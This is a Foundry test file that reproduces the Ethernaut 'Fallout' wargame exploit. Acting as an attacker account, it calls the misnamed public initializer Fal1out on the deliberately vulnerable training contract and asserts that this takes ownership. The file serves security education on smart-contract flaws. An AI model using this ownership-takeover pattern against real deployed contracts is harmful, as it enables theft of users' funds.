// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

/// @notice Minimal ABI used by the modern test harness to interact with the Solidity 0.6 target.
interface IFallout {
    /// @notice Calls the vulnerable public initializer.
    function Fal1out() external payable;

    /// @notice Returns the owner currently stored by the target.
    function owner() external view returns (address);
}

/// @title Ethernaut 02 - Fallout Exploit Test
/// @notice Verifies that any caller can invoke Fal1out and take ownership.
contract FalloutTest is Test {
    /// @notice Account used to execute the exploit.
    address attacker = makeAddr("attacker");

    /// @notice Interface for the deployed Solidity 0.6 target.
    IFallout falloutContract;

    /// @notice Deploys the legacy artifact and funds the attacker before each test.
    /// @dev deployCode keeps the vulnerable source on Solidity 0.6 while this test uses modern forge-std.
    function setUp() public {
        falloutContract = IFallout(deployCode("02_Fallout.sol:Fallout"));
        vm.deal(attacker, 1 ether);
    }

    /// @notice Reproduces the ownership takeover through the public Fal1out function.
    function testExploit() public {
        vm.startPrank(attacker);

        // Call the function that was intended to initialize the contract owner.
        falloutContract.Fal1out{value: 1 wei}();

        // Confirm that the unrestricted call assigned ownership to the attacker.
        assertEq(falloutContract.owner(), attacker);

        vm.stopPrank();
    }
}
